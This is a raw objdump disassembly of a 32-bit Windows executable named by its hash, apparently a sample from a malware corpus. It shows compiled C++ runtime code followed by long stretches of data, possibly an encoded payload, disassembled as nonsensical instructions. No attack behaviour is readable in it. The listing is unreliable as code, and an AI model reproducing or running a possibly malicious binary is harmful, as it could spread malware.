
60f4de6a343a174eebb2455834b4333103d0159b5a975f793e98b91bcc96594a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	movsx  eax,BYTE PTR [esp+0xc]
  401005:	push   DWORD PTR [esp+0x8]
  401009:	push   eax
  40100a:	push   DWORD PTR [esp+0xc]
  40100e:	call   0x42e4e0
  401013:	add    esp,0xc
  401016:	ret    
  401017:	push   esi
  401018:	mov    esi,ecx
  40101a:	call   0x42e621
  40101f:	push   DWORD PTR [esp+0x8]
  401023:	lea    ecx,[esi+0xc]
  401026:	mov    DWORD PTR [esi],0x4392dc
  40102c:	call   0x42ae79
  401031:	mov    eax,esi
  401033:	pop    esi
  401034:	ret    0x4
  401037:	push   esi
  401038:	mov    esi,ecx
  40103a:	push   0x0
  40103c:	push   0x1
  40103e:	lea    ecx,[esi+0xc]
  401041:	mov    DWORD PTR [esi],0x4392dc
  401047:	call   0x42bb7b
  40104c:	mov    ecx,esi
  40104e:	pop    esi
  40104f:	jmp    0x42e6b9
  401054:	cmp    DWORD PTR [ecx+0x24],0x10
  401058:	jb     0x40105e
  40105a:	mov    eax,DWORD PTR [ecx+0x10]
  40105d:	ret    
  40105e:	lea    eax,[ecx+0x10]
  401061:	ret    
  401062:	push   esi
  401063:	mov    esi,ecx
  401065:	call   0x401037
  40106a:	test   BYTE PTR [esp+0x8],0x1
  40106f:	je     0x401078
  401071:	push   esi
  401072:	call   0x42e750
  401077:	pop    ecx
  401078:	mov    eax,esi
  40107a:	pop    esi
  40107b:	ret    0x4
  40107e:	mov    DWORD PTR [ecx],0x43b4d0
  401084:	jmp    0x401037
  401089:	push   esi
  40108a:	mov    esi,ecx
  40108c:	mov    DWORD PTR [esi],0x43b4d0
  401092:	call   0x401037
  401097:	test   BYTE PTR [esp+0x8],0x1
  40109c:	je     0x4010a5
  40109e:	push   esi
  40109f:	call   0x42e750
  4010a4:	pop    ecx
  4010a5:	mov    eax,esi
  4010a7:	pop    esi
  4010a8:	ret    0x4
  4010ab:	mov    DWORD PTR [ecx],0x4392f4
  4010b1:	jmp    0x401037
  4010b6:	push   esi
  4010b7:	mov    esi,ecx
  4010b9:	mov    DWORD PTR [esi],0x4392f4
  4010bf:	call   0x401037
  4010c4:	test   BYTE PTR [esp+0x8],0x1
  4010c9:	je     0x4010d2
  4010cb:	push   esi
  4010cc:	call   0x42e750
  4010d1:	pop    ecx
  4010d2:	mov    eax,esi
  4010d4:	pop    esi
  4010d5:	ret    0x4
  4010d8:	push   ebp
  4010d9:	mov    ebp,esp
  4010db:	sub    esp,0x10
  4010de:	push   esi
  4010df:	lea    eax,[ebp-0x10]
  4010e2:	push   edi
  4010e3:	push   eax
  4010e4:	call   0x42d5d6
  4010e9:	mov    esi,eax
  4010eb:	mov    eax,DWORD PTR [ebp+0x8]
  4010ee:	mov    edi,eax
  4010f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f3:	pop    ecx
  4010f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f5:	pop    edi
  4010f6:	pop    esi
  4010f7:	leave  
  4010f8:	ret    0x4
  4010fb:	push   ebp
  4010fc:	mov    ebp,esp
  4010fe:	push   ecx
  4010ff:	push   esi
  401100:	mov    esi,ecx
  401102:	cmp    DWORD PTR [esi],0x0
  401105:	jne    0x40112b
  401107:	push   0x0
  401109:	lea    ecx,[ebp-0x4]
  40110c:	call   0x42d311
  401111:	cmp    DWORD PTR [esi],0x0
  401114:	jne    0x401123
  401116:	inc    DWORD PTR ds:0x43f9c0
  40111c:	mov    eax,ds:0x43f9c0
  401121:	mov    DWORD PTR [esi],eax
  401123:	lea    ecx,[ebp-0x4]
  401126:	call   0x42d334
  40112b:	mov    eax,DWORD PTR [esi]
  40112d:	pop    esi
  40112e:	leave  
  40112f:	ret    
  401130:	push   ebp
  401131:	mov    ebp,esp
  401133:	push   ecx
  401134:	push   esi
  401135:	mov    esi,ecx
  401137:	push   0x0
  401139:	lea    ecx,[ebp-0x4]
  40113c:	call   0x42d311
  401141:	mov    eax,DWORD PTR [esi+0x4]
  401144:	cmp    eax,0xffffffff
  401147:	jae    0x40114d
  401149:	inc    eax
  40114a:	mov    DWORD PTR [esi+0x4],eax
  40114d:	lea    ecx,[ebp-0x4]
  401150:	call   0x42d334
  401155:	pop    esi
  401156:	leave  
  401157:	ret    
  401158:	push   ebp
  401159:	mov    ebp,esp
  40115b:	push   ecx
  40115c:	push   esi
  40115d:	push   edi
  40115e:	mov    edi,ecx
  401160:	push   0x0
  401162:	lea    ecx,[ebp-0x4]
  401165:	call   0x42d311
  40116a:	mov    eax,DWORD PTR [edi+0x4]
  40116d:	test   eax,eax
  40116f:	jbe    0x40117a
  401171:	cmp    eax,0xffffffff
  401174:	jae    0x40117a
  401176:	dec    eax
  401177:	mov    DWORD PTR [edi+0x4],eax
  40117a:	mov    esi,DWORD PTR [edi+0x4]
  40117d:	neg    esi
  40117f:	sbb    esi,esi
  401181:	not    esi
  401183:	lea    ecx,[ebp-0x4]
  401186:	and    esi,edi
  401188:	call   0x42d334
  40118d:	pop    edi
  40118e:	mov    eax,esi
  401190:	pop    esi
  401191:	leave  
  401192:	ret    
  401193:	mov    DWORD PTR [ecx],0x4391e8
  401199:	ret    
  40119a:	mov    ecx,DWORD PTR [ecx]
  40119c:	test   ecx,ecx
  40119e:	je     0x4011b1
  4011a0:	call   0x401158
  4011a5:	test   eax,eax
  4011a7:	je     0x4011b1
  4011a9:	mov    edx,DWORD PTR [eax]
  4011ab:	push   0x1
  4011ad:	mov    ecx,eax
  4011af:	call   DWORD PTR [edx]
  4011b1:	ret    
  4011b2:	test   BYTE PTR [esp+0x4],0x1
  4011b7:	push   esi
  4011b8:	mov    esi,ecx
  4011ba:	mov    DWORD PTR [esi],0x4391e8
  4011c0:	je     0x4011c9
  4011c2:	push   esi
  4011c3:	call   0x42e750
  4011c8:	pop    ecx
  4011c9:	mov    eax,esi
  4011cb:	pop    esi
  4011cc:	ret    0x4
  4011cf:	mov    al,0x1
  4011d1:	ret    
  4011d2:	xor    eax,eax
  4011d4:	inc    eax
  4011d5:	ret    
  4011d6:	push   ebp
  4011d7:	mov    ebp,esp
  4011d9:	sub    esp,0x74
  4011dc:	mov    eax,DWORD PTR [ebp+0x10]
  4011df:	push   esi
  4011e0:	mov    esi,ecx
  4011e2:	push   edi
  4011e3:	push   0x43b560
  4011e8:	lea    ecx,[ebp-0x74]
  4011eb:	mov    DWORD PTR [esi+0x4],eax
  4011ee:	mov    DWORD PTR [esi],0x439200
  4011f4:	call   0x42d140
  4011f9:	push   eax
  4011fa:	mov    ecx,esi
  4011fc:	call   0x401274
  401201:	lea    ecx,[ebp-0x74]
  401204:	call   0x42d07d
  401209:	mov    edi,DWORD PTR [ebp+0x8]
  40120c:	test   edi,edi
  40120e:	je     0x401224
  401210:	mov    ecx,esi
  401212:	call   0x401299
  401217:	mov    al,BYTE PTR [ebp+0xc]
  40121a:	neg    al
  40121c:	mov    DWORD PTR [esi+0x10],edi
  40121f:	sbb    eax,eax
  401221:	mov    DWORD PTR [esi+0x14],eax
  401224:	pop    edi
  401225:	mov    eax,esi
  401227:	pop    esi
  401228:	leave  
  401229:	ret    0xc
  40122c:	push   esi
  40122d:	mov    esi,DWORD PTR [esp+0x8]
  401231:	test   esi,esi
  401233:	je     0x401259
  401235:	cmp    DWORD PTR [esi],0x0
  401238:	jne    0x401259
  40123a:	push   0x18
  40123c:	call   0x42d8d9
  401241:	test   eax,eax
  401243:	pop    ecx
  401244:	je     0x401255
  401246:	push   0x0
  401248:	push   0x0
  40124a:	push   0x0
  40124c:	mov    ecx,eax
  40124e:	call   0x4011d6
  401253:	jmp    0x401257
  401255:	xor    eax,eax
  401257:	mov    DWORD PTR [esi],eax
  401259:	push   0x2
  40125b:	pop    eax
  40125c:	pop    esi
  40125d:	ret    
  40125e:	push   esi
  40125f:	mov    esi,ecx
  401261:	mov    DWORD PTR [esi],0x439200
  401267:	call   0x401299
  40126c:	mov    DWORD PTR [esi],0x4391e8
  401272:	pop    esi
  401273:	ret    
  401274:	push   ebp
  401275:	mov    ebp,esp
  401277:	sub    esp,0x10
  40127a:	push   esi
  40127b:	push   edi
  40127c:	lea    eax,[ebp-0x10]
  40127f:	mov    edi,ecx
  401281:	mov    ecx,DWORD PTR [ebp+0x8]
  401284:	push   eax
  401285:	call   0x4010d8
  40128a:	add    edi,0x8
  40128d:	mov    esi,eax
  40128f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401293:	pop    edi
  401294:	pop    esi
  401295:	leave  
  401296:	ret    0x4
  401299:	mov    eax,DWORD PTR [ecx+0x14]
  40129c:	test   eax,eax
  40129e:	jle    0x4012aa
  4012a0:	push   DWORD PTR [ecx+0x10]
  4012a3:	call   0x42e0ed
  4012a8:	pop    ecx
  4012a9:	ret    
  4012aa:	jge    0x4012b5
  4012ac:	push   DWORD PTR [ecx+0x10]
  4012af:	call   0x42e61c
  4012b4:	pop    ecx
  4012b5:	ret    
  4012b6:	movzx  eax,BYTE PTR [esp+0x4]
  4012bb:	add    ecx,0x8
  4012be:	push   ecx
  4012bf:	push   eax
  4012c0:	call   0x42d6a1
  4012c5:	pop    ecx
  4012c6:	pop    ecx
  4012c7:	ret    0x4
  4012ca:	push   esi
  4012cb:	mov    esi,DWORD PTR [esp+0x8]
  4012cf:	cmp    esi,DWORD PTR [esp+0xc]
  4012d3:	je     0x4012ef
  4012d5:	push   edi
  4012d6:	lea    edi,[ecx+0x8]
  4012d9:	movzx  eax,BYTE PTR [esi]
  4012dc:	push   edi
  4012dd:	push   eax
  4012de:	call   0x42d6a1
  4012e3:	mov    BYTE PTR [esi],al
  4012e5:	inc    esi
  4012e6:	cmp    esi,DWORD PTR [esp+0x18]
  4012ea:	pop    ecx
  4012eb:	pop    ecx
  4012ec:	jne    0x4012d9
  4012ee:	pop    edi
  4012ef:	mov    eax,esi
  4012f1:	pop    esi
  4012f2:	ret    0x8
  4012f5:	movzx  eax,BYTE PTR [esp+0x4]
  4012fa:	add    ecx,0x8
  4012fd:	push   ecx
  4012fe:	push   eax
  4012ff:	call   0x42d82d
  401304:	pop    ecx
  401305:	pop    ecx
  401306:	ret    0x4
  401309:	push   esi
  40130a:	mov    esi,DWORD PTR [esp+0x8]
  40130e:	cmp    esi,DWORD PTR [esp+0xc]
  401312:	je     0x40132e
  401314:	push   edi
  401315:	lea    edi,[ecx+0x8]
  401318:	movzx  eax,BYTE PTR [esi]
  40131b:	push   edi
  40131c:	push   eax
  40131d:	call   0x42d82d
  401322:	mov    BYTE PTR [esi],al
  401324:	inc    esi
  401325:	cmp    esi,DWORD PTR [esp+0x18]
  401329:	pop    ecx
  40132a:	pop    ecx
  40132b:	jne    0x401318
  40132d:	pop    edi
  40132e:	mov    eax,esi
  401330:	pop    esi
  401331:	ret    0x8
  401334:	mov    al,BYTE PTR [esp+0x4]
  401338:	ret    0x4
  40133b:	push   ebp
  40133c:	mov    ebp,esp
  40133e:	mov    eax,DWORD PTR [ebp+0xc]
  401341:	sub    eax,DWORD PTR [ebp+0x8]
  401344:	push   eax
  401345:	push   DWORD PTR [ebp+0x8]
  401348:	push   DWORD PTR [ebp+0x10]
  40134b:	call   0x42da10
  401350:	mov    eax,DWORD PTR [ebp+0xc]
  401353:	add    esp,0xc
  401356:	pop    ebp
  401357:	ret    0xc
  40135a:	mov    al,BYTE PTR [esp+0x4]
  40135e:	ret    0x8
  401361:	push   ebp
  401362:	mov    ebp,esp
  401364:	mov    eax,DWORD PTR [ebp+0xc]
  401367:	sub    eax,DWORD PTR [ebp+0x8]
  40136a:	push   eax
  40136b:	push   DWORD PTR [ebp+0x8]
  40136e:	push   DWORD PTR [ebp+0x14]
  401371:	call   0x42da10
  401376:	mov    eax,DWORD PTR [ebp+0xc]
  401379:	add    esp,0xc
  40137c:	pop    ebp
  40137d:	ret    0x10
  401380:	push   esi
  401381:	mov    esi,ecx
  401383:	call   0x40125e
  401388:	test   BYTE PTR [esp+0x8],0x1
  40138d:	je     0x401396
  40138f:	push   esi
  401390:	call   0x42e750
  401395:	pop    ecx
  401396:	mov    eax,esi
  401398:	pop    esi
  401399:	ret    0x4
  40139c:	push   esi
  40139d:	mov    esi,ecx
  40139f:	call   0x42cb7b
  4013a4:	test   BYTE PTR [esp+0x8],0x1
  4013a9:	je     0x4013b2
  4013ab:	push   esi
  4013ac:	call   0x42e750
  4013b1:	pop    ecx
  4013b2:	mov    eax,esi
  4013b4:	pop    esi
  4013b5:	ret    0x4
  4013b8:	push   ebx
  4013b9:	arpl   WORD PTR [ebp+0x73],sp
  4013bc:	cs inc ebx
  4013be:	outs   dx,DWORD PTR ds:[esi]
  4013bf:	ins    DWORD PTR es:[edi],dx
  4013c0:	ins    DWORD PTR es:[edi],dx
  4013c1:	popa   
  4013c2:	outs   dx,BYTE PTR ds:[esi]
  4013c3:	fs push ebx
  4013c5:	ja     0x401430
  4013c7:	je     0x40142c
  4013c9:	push   0x7379532c
  4013ce:	je     0x401435
  4013d0:	ins    DWORD PTR es:[edi],dx
  4013d1:	cs push esp
  4013d3:	gs js  0x40144a
  4013d6:	cs push edx
  4013d8:	gs addr16 jne 0x401448
  4013dc:	popa   
  4013dd:	jb     0x401424
  4013df:	js     0x401451
  4013e1:	jb     0x401448
  4013e3:	jae    0x401458
  4013e5:	imul   ebp,DWORD PTR [edi+0x6e],0x65522e73
  4013ec:	addr16 gs js 0x401419
  4013f0:	and    bh,BYTE PTR [esi]
  4013f2:	or     eax,0x2020200a
  4013f7:	and    BYTE PTR [edi+ebp*1],bh
  4013fa:	ins    DWORD PTR es:[edi],dx
  4013fb:	gs ins DWORD PTR es:[edi],dx
  4013fd:	bound  esp,QWORD PTR [ebp+0x72]
  401400:	ds or  eax,0x13f0ef0a
  401406:	scas   al,BYTE PTR es:[edi]
  401407:	inc    edx
  401408:	xchg   ebp,eax
  401409:	hlt    
  40140a:	loopne 0x4013eb
  40140c:	jns    0x401463
  40140e:	adc    esp,DWORD PTR ds:0x7a0c0b6c
  401414:	lahf   
  401415:	nop
  401416:	inc    esi
  401417:	pop    edx
  401418:	xchg   edi,eax
  401419:	or     eax,0x5f
  40141e:	mov    ebx,0x48e3c3d2
  401423:	outs   dx,BYTE PTR ds:[esi]
  401424:	ret    
  401425:	fist   DWORD PTR [edi+0x8d1d1db]
  40142b:	rcl    BYTE PTR [ebx],0x7b
  40142e:	jg     0x4013db
  401430:	xor    eax,0xf1060ad
  401435:	ins    BYTE PTR es:[edi],dx
  401436:	jmp    0x401460
  401438:	sub    BYTE PTR [ecx-0x4fffffb6],0xf7
  40143f:	add    BYTE PTR es:[eax],al
  401442:	add    BYTE PTR [ebp+0x45],al
  401445:	inc    ebp
  401446:	inc    ebp
  401447:	inc    ebp
  401448:	inc    ebp
  401449:	inc    ebp
  40144a:	inc    ebp
  40144b:	inc    ebp
  40144c:	adc    BYTE PTR ds:0xffffff7d,cl
  401452:	(bad)  
  401453:	(bad)  
  401454:	(bad)  
  401455:	(bad)  
  401456:	(bad)  
  401457:	dec    DWORD PTR [ebp-0xb9d3473]
  40145d:	push   edi
  40145e:	xor    al,0x1a
  401460:	pop    esp
  401461:	repnz sbb esi,DWORD PTR [eax-0x64]
  401465:	jmp    0xf27378aa
  40146a:	push   es
  40146b:	test   al,0x68
  40146d:	sbb    ebp,esp
  40146f:	adc    BYTE PTR [ecx-0x53],dl
  401472:	lea    ecx,[ebp-0x7272e1a7]
  401478:	(bad)  
  401479:	inc    edi
  40147a:	lea    ecx,[ebp+0x32ef5f72]
  401480:	ins    BYTE PTR es:[edi],dx
  401481:	mov    ah,0x91
  401483:	sub    al,0x6c
  401485:	xor    esp,DWORD PTR [edi-0x163a8a38]
  40148b:	pop    esp
  40148c:	mov    ebp,0xfc7df2c6
  401491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401492:	xor    dh,BYTE PTR [ebx-0x73]
  401495:	lea    esp,[esi]
  401497:	in     al,dx
  401498:	jb     0x4014ee
  40149a:	lea    ecx,[ebp+0x18d5568d]
  4014a0:	xor    al,0x8c
  4014a2:	or     BYTE PTR [ecx],ah
  4014a4:	(bad)  
  4014a5:	cmc    
  4014a6:	sub    DWORD PTR [ebx+0xd],ebx
  4014a9:	ja     0x401471
  4014ab:	imul   edi,DWORD PTR [ebx+0x279b3a6d],0xffffffcc
  4014b2:	push   esi
  4014b3:	sub    eax,0x37ddca1c
  4014b8:	or     BYTE PTR [ebx],0x1d
  4014bb:	ret    
  4014bc:	pop    ss
  4014bd:	mov    eax,0x8d8db9bd
  4014c2:	adc    al,0x1
  4014c4:	lea    ecx,[ebp-0x74747473]
  4014ca:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4014d0:	iret   
  4014d1:	jecxz  0x4014cb
	...
  4014db:	add    BYTE PTR [ebx+0x86d188b],cl
  4014e1:	cmp    esi,ecx
  4014e3:	dec    esp
  4014e4:	into   
  4014e5:	cmp    edx,DWORD PTR [ebx-0x36]
  4014e8:	push   esi
  4014e9:	aaa    
  4014ea:	push   ss
  4014eb:	xchg   ebp,eax
  4014ec:	(bad)
  4014f0:	(bad)  
  4014f1:	imul   edi,DWORD PTR [edx],0xffffffce
  4014f4:	jle    0x401540
  4014f6:	mov    ecx,DWORD PTR [ebx-0x6032d820]
  4014fc:	test   ch,ch
  4014fe:	jno    0x40149e
  401500:	xor    DWORD PTR [eax-0x5],ebp
  401503:	push   eax
  401504:	xor    DWORD PTR [eax],eax
  401506:	xlat   BYTE PTR ds:[ebx]
  401507:	inc    ecx
  401508:	loop   0x4014c6
  40150a:	clc    
  40150b:	imul   BYTE PTR [edx+0x5de461af]
  401511:	jge    0x40156e
  401513:	and    eax,0x6b8b8bbb
  401518:	aaa    
  401519:	jge    0x4014a6
  40151b:	mov    esi,DWORD PTR [eax]
  40151d:	jnp    0x4014b8
  40151f:	mov    esp,DWORD PTR [ecx+ebp*4]
  401522:	bound  edx,QWORD PTR [edi-0x2]
  401525:	push   edx
  401526:	lods   al,BYTE PTR ds:[esi]
  401527:	rol    DWORD PTR [ebp+0x33140fe6],0xa1
  40152e:	dec    ebp
  40152f:	mov    ah,0x78
  401531:	js     0x401593
  401533:	push   ebp
  401534:	fadd   DWORD PTR [ecx+0x240bb78d]
  40153a:	and    al,0x24
  40153c:	inc    esp
  40153d:	fisub  DWORD PTR [esp]
  401540:	dec    eax
  401541:	sub    ah,BYTE PTR [esp]
  401544:	and    al,0x89
  401546:	mov    DWORD PTR [ecx-0x76767677],ecx
  40154c:	mov    DWORD PTR [ecx-0x485b46cf],ecx
  401552:	mov    dh,0x1c
  401554:	inc    ecx
  401555:	fadd   DWORD PTR [edi+0x5ac04d41]
  40155b:	push   ss
  40155c:	xchg   ebp,eax
  40155d:	arpl   WORD PTR [esi-0x29],cx
  401560:	fcmovnu st,st(0)
  401562:	sub    BYTE PTR [edx+0x8d6d],bl
  401568:	add    BYTE PTR [eax],al
  40156a:	add    BYTE PTR [eax],al
  40156c:	add    BYTE PTR [eax],al
  40156e:	add    al,al
  401570:	shl    BYTE PTR [edx-0x3f7fa880],0xc0
  401577:	repnz add BYTE PTR [edx+0x62],ch
  40157b:	sahf   
  40157c:	lea    edi,[eax]
  40157e:	push   ebp
  40157f:	dec    edi
  401580:	mov    bh,0xcb
  401582:	shrd   DWORD PTR [ebx-0x5e8389ef],ebp,0xe2
  40158a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40158b:	daa    
  40158c:	push   0x55afa664
  401591:	or     eax,0x49bc740a
  401596:	cli    
  401597:	out    dx,eax
  401598:	rol    DWORD PTR [ebp-0x1e7b3f40],cl
  40159e:	rol    al,0xdf
  4015a1:	push   ecx
  4015a2:	test   eax,0x2ed28bc0
  4015a7:	or     DWORD PTR [edx],0xfffffff0
  4015aa:	out    dx,al
  4015ab:	cmovs  esi,DWORD PTR [ebx-0x74]
  4015af:	loope  0x4015d5
  4015b1:	retf   
  4015b2:	popa   
  4015b3:	cld    
  4015b4:	mov    ebp,0x950932d7
  4015b9:	push   eax
  4015ba:	inc    eax
  4015bb:	mov    ds:0x8b8b8b59,al
  4015c0:	lahf   
  4015c1:	pop    ecx
  4015c2:	and    DWORD PTR [ecx+0x74],ecx
  4015c5:	sub    esi,DWORD PTR [eax+edx*4+0x22]
  4015c9:	mov    al,0x37
  4015cb:	lods   eax,DWORD PTR ds:[esi]
  4015cc:	push   ebp
  4015cd:	stos   DWORD PTR es:[edi],eax
  4015ce:	jecxz  0x401595
  4015d0:	lock dec esi
  4015d2:	cdq    
  4015d3:	pop    ss
  4015d4:	mov    bl,0xb0
  4015d6:	or     al,0xdf
  4015d8:	fild   DWORD PTR [ecx-0x23]
  4015db:	cmp    BYTE PTR [edi+0x91a8b8b],ch
  4015e1:	jns    0x40156e
  4015e3:	mov    ecx,DWORD PTR [ebx-0x72727273]
  4015e9:	lea    ecx,[ebp-0x19727273]
  4015ef:	or     DWORD PTR [esi+0x45454545],esi
  4015f5:	inc    ebp
  4015f6:	inc    ebp
  4015f7:	inc    ebp
  4015f8:	inc    ebp
  4015f9:	inc    ebp
  4015fa:	(bad)  
  4015fb:	inc    DWORD PTR [ebp-0x1d]
  4015fe:	ficomp WORD PTR [ebx-0xa]
  401601:	dec    edx
  401602:	clc    
  401603:	mov    al,ds:0x5cb0ca4
  401608:	fsub   DWORD PTR [ebx-0x1d]
  40160b:	xchg   ecx,eax
  40160c:	imul   eax,DWORD PTR [ebx-0x17],0x71a616fe
  401613:	inc    ebx
  401614:	(bad)  
  401615:	dec    ecx
  401617:	ret    0xffff
  40161a:	out    0xd5,eax
  40161c:	(bad)  
  40161d:	call   ebx
  40161f:	pop    ss
  401620:	cmp    edx,DWORD PTR [edx+0x7f39cc4f]
  401626:	test   DWORD PTR [edi+0x70704176],esi
  40162c:	jae    0x40165c
  40162e:	push   edi
  40162f:	bound  edx,QWORD PTR gs:[ebx+0x65]
  401633:	jb     0x4016ab
  401635:	imul   esp,DWORD PTR [ebx+0x65],0x73412e73
  40163c:	jae    0x4016a7
  40163e:	outs   dx,BYTE PTR ds:[si]
  401640:	ins    DWORD PTR es:[edi],dx
  401641:	outs   dx,BYTE PTR gs:[esi]
  401643:	je     0x401697
  401645:	jne    0x4016b3
  401647:	gs and esp,DWORD PTR cs:[ebx+0x74]
  40164c:	outs   dx,DWORD PTR ds:[esi]
  40164d:	jb     0x401677
  40164f:	dec    ebp
  401650:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  401657:	je     0x401687
  401659:	inc    esp
  40165a:	gs jbe 0x40169e
  40165d:	jo     0x4016cf
  40165f:	jae    0x40168f
  401661:	push   edi
  401662:	bound  edx,QWORD PTR gs:[ebx+0x65]
  401666:	jb     0x4016de
  401668:	imul   esp,DWORD PTR [ebx+0x65],0x6f432e73
  40166f:	ins    DWORD PTR es:[edi],dx
  401670:	ins    DWORD PTR es:[edi],dx
  401671:	popa   
  401672:	outs   dx,BYTE PTR ds:[esi]
  401673:	fs push ebx
  401675:	ja     0x4016e0
  401677:	je     0x4016dc
  401679:	push   0x7379532c
  40167e:	je     0x4016e5
  401680:	ins    DWORD PTR es:[edi],dx
  401681:	cs push esp
  401683:	gs js  0x4016fa
  401686:	cs push edx
  401688:	gs addr16 (bad) 
  40168b:	fstp   st(7)
  40168d:	jecxz  0x4016dc
  40168f:	lock retf 0x89e9
  401693:	aaa    
  401694:	cmp    BYTE PTR [ebp+0xff85d9],dh
  40169a:	fisttp WORD PTR [ebp+0x23]
  40169d:	xchg   esi,eax
  40169e:	add    BYTE PTR [eax],al
  4016a0:	add    bh,ch
  4016a2:	adc    DWORD PTR [esi],0x20ead2f0
  4016a8:	adc    al,0xf
  4016aa:	pop    esp
  4016ab:	cs add ecx,ebx
  4016ae:	out    dx,al
  4016af:	push   ebp
  4016b0:	lahf   
  4016b1:	fst    st(1)
  4016b3:	das    
  4016b4:	or     esp,DWORD PTR ds:0x1d37cee0
  4016ba:	pop    ecx
  4016bb:	pop    ebp
  4016bc:	cdq    
  4016bd:	cmc    
  4016be:	mov    ds:0x66bd04d0,eax
  4016c3:	sldt   WORD PTR [eax]
  4016c6:	retf   0x95
	...
  4016d1:	add    BYTE PTR [eax],al
  4016d3:	add    BYTE PTR [esp+edx*4],ah
  4016d6:	push   ebx
	...
  4016df:	add    BYTE PTR [esp+eax*1],al
  4016e2:	outs   dx,BYTE PTR ds:[esi]
  4016e3:	gs pop ss
  4016e5:	stos   DWORD PTR es:[edi],eax
  4016e6:	xchg   edi,eax
  4016e7:	lahf   
  4016e8:	push   eax
  4016e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016ea:	sbb    ebx,eax
  4016ec:	jle    0x401706
  4016ee:	jge    0x40168a
  4016f0:	lods   al,BYTE PTR ds:[esi]
  4016f1:	jns    0x401750
  4016f3:	mul    BYTE PTR [eax-0x5e]
  4016f6:	sub    ebp,DWORD PTR [esi]
  4016f8:	clc    
  4016f9:	std    
  4016fa:	add    al,0x4
  4016fc:	dec    ebx
  4016fd:	mov    al,BYTE PTR [edi]
  4016ff:	imul   ebx,DWORD PTR [eax+0x6b99ebd7],0x76
  401706:	push   ebx
  401707:	nop
  401708:	sub    al,0x22
  40170a:	add    BYTE PTR [esi+0x6515a5e3],dl
  401710:	lds    ebp,FWORD PTR [eax]
  401712:	in     al,dx
  401713:	mov    ah,0xf6
  401715:	lock loope 0x4016be
  401718:	je     0x40171e
  40171a:	add    al,0x7
  40171c:	aad    0x3b
  40171e:	add    al,0x4
  401720:	pop    edi
  401721:	mov    ecx,0x118d0413
  401726:	inc    ebx
  401727:	and    BYTE PTR gs:[edx+0x5e],ch
  40172b:	leave  
  40172c:	jmp    0x40172d
  40172e:	mov    ah,0x3
  401730:	(bad)  
  401731:	xchg   ebp,eax
  401732:	mov    BYTE PTR [ecx-0x23a79732],ah
  401738:	retf   0x996a
  40173b:	jle    0x4016d2
  40173d:	lea    ecx,[ebp-0x72a11473]
  401743:	lea    esp,[eax]
  401745:	stos   DWORD PTR es:[edi],eax
  401746:	lea    ecx,[ebp+0x8d]
  40174c:	add    BYTE PTR [eax],al
  40174e:	add    BYTE PTR [eax],al
  401750:	add    BYTE PTR [eax],al
  401752:	mov    cl,BYTE PTR [esi-0xa197a41]
  401758:	xchg   BYTE PTR [ecx-0x61],bh
  40175b:	cdq    
  40175c:	idiv   ebp
  40175e:	jmp    0xccc3:0xe9b252d0
  401765:	inc    eax
  401766:	into   
  401767:	inc    eax
  401768:	sub    ch,BYTE PTR [ecx+0x24242424]
  40176e:	and    al,0x24
  401770:	and    al,0x24
  401772:	and    al,0x8d
  401774:	(bad)  
  401775:	enter  0x7379,0x53
  401779:	lea    ecx,[ebp+0x2609826b]
  40177f:	mov    ah,0xee
  401781:	jo     0x401719
  401783:	mov    eax,0x5e2ece53
  401788:	(bad)  
  401789:	scas   eax,DWORD PTR es:[edi]
  40178a:	or     edi,DWORD PTR [ebx+0x7c]
  40178d:	leave  
  40178e:	dec    esi
  40178f:	outs   dx,DWORD PTR ds:[esi]
  401790:	push   edx
  401791:	sbb    BYTE PTR [ecx],dl
  401793:	scas   al,BYTE PTR es:[edi]
  401794:	push   esp
  401795:	pop    edx
  401796:	call   0x3ae9e719
  40179b:	jnp    0x401783
  40179d:	(bad)  
  40179e:	lea    ecx,[ebp-0x7272db07]
  4017a4:	ins    DWORD PTR es:[edi],dx
  4017a5:	dec    DWORD PTR [ebp+ecx*4+0x74a52aff]
  4017ac:	mov    ds:0x2eb8e525,al
  4017b1:	sub    al,0x48
  4017b3:	out    0xa,eax
  4017b5:	sbb    edx,edx
  4017b7:	aas    
  4017b8:	jecxz  0x40182a
  4017ba:	aas    
  4017bb:	lds    edi,FWORD PTR [esi+0x1c]
  4017be:	xlat   BYTE PTR ss:[ebx]
  4017c0:	push   edx
  4017c1:	(bad)  
  4017c2:	(bad)  
  4017c3:	inc    DWORD PTR [ecx+0x7e]
  4017c6:	xchg   dh,bl
  4017c8:	xchg   ebx,eax
  4017c9:	pop    edx
  4017ca:	cli    
  4017cb:	cmp    esi,DWORD PTR [eax-0x2e]
  4017ce:	sub    eax,0x41abd5a4
  4017d3:	sar    bl,1
  4017d5:	out    0xd9,eax
  4017d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017d8:	mov    ah,0x8b
  4017da:	adc    al,0x58
  4017dc:	push   es
  4017dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017de:	mov    ah,bl
  4017e0:	iret   
  4017e1:	(bad)  
  4017e2:	push   DWORD PTR [eax+0x48]
  4017e5:	daa    
  4017e6:	(bad)  
  4017e7:	(bad)  
  4017e8:	inc    DWORD PTR [eax]
	...
  4017f2:	push   ds
  4017f3:	push   ds
  4017f4:	mov    cl,0x8b
  4017f6:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4017fc:	mov    ecx,DWORD PTR [ebx-0x6fcf7475]
  401802:	xchg   esi,eax
  401803:	mov    dh,ch
  401805:	and    esp,DWORD PTR [esi]
  401807:	cmp    al,BYTE PTR [edi+0x470f365a]
  40180d:	pop    eax
  40180e:	cld    
  40180f:	stos   BYTE PTR es:[edi],al
  401810:	or     esi,ecx
  401812:	repz push ebp
  401814:	jne    0x40181d
  401816:	in     al,dx
